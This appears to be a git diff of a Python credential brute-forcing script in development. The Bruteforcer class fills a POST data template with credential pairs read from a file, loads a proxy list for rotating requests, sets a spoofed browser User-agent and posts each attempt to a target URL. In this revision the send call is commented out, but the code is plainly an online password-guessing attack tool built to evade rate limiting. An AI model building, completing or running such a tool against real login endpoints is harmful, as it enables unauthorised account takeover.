@@ -61,30 +61,29 @@ class BruteforcerG:
 
 
 class Bruteforcer:
-    def __init__(self, data_scheme_file, credentials_file_raw) -> None:
-        with open(data_scheme_file, "r") as file:
-            self.data_scheme = file.read().rstrip()
-            print(self.data_scheme)
-            print(len(re.findall("\$\{(\w)+}", self.data_scheme)))
-            with open(credentials_file_raw) as credentials_file:
-                self.variables_to_injection, self.credentials_list = do_sth(
-                    self.data_scheme, credentials_file
-                )
-
-            print(self.data_scheme.replace("${answer}", "dupa"))
-            print(self.data_scheme)
+    def __init__(
+        self, url, data_scheme_file_raw, credentials_file_raw, proxies_file_raw
+    ) -> None:
+        self.url = url
+        with open(data_scheme_file_raw, "r") as data_scheme_file:
+            self.data_scheme = data_scheme_file.read().rstrip()
+        print(len(re.findall("\$\{(\w)+}", self.data_scheme)))
+        with open(credentials_file_raw) as credentials_file:
+            self.variables_to_injection, self.credentials_list = do_sth(
+                self.data_scheme, credentials_file
+            )
+        with open(proxies_file_raw) as proxies_file:
+            self.proxies = [line.rstrip() for line in proxies_file]
 
     def perform_bruteforce(self):
-        print(self.credentials_list)
-        print(self.data_scheme)
-        print(self.variables_to_injection)
         for credentials in self.credentials_list:
             data_to_post = self.data_scheme
             for i in range(len(self.variables_to_injection)):
                 data_to_post = data_to_post.replace(
                     self.variables_to_injection[i], credentials[i]
                 )
-                print(data_to_post)
+            print(data_to_post)
+            # self.standard_injection(str.encode(data_to_post))
         pass
 
     def proxy_rotating_injection(self, index, data_bytes):
@@ -98,8 +97,13 @@ class Bruteforcer:
         with urllib.request.urlopen(request, timeout=10) as response:
             print(response.status)
 
-    def standard_injection(self, index, data_bytes):
-        pass
+    def standard_injection(self, data_bytes):
+        opener = urllib.request.build_opener()
+        opener.addheaders = [("User-agent", "Mozilla/5.0")]
+        urllib.request.install_opener(opener)
+        request = urllib.request.Request(self.url, data=data_bytes)
+        with urllib.request.urlopen(request, timeout=10) as response:
+            print(response.status)
 
     def funct(self):
         print("OK")
@@ -124,5 +128,7 @@ parser = argparse.ArgumentParser()
 args = collect_input_args(parser)
 validate_input_args(args)
 
-bruteforce_tool = Bruteforcer(args.data_scheme, args.credentials_file)
+bruteforce_tool = Bruteforcer(
+    args.url, args.data_scheme, args.credentials_file, args.proxies
+)
 bruteforce_tool.perform_bruteforce()
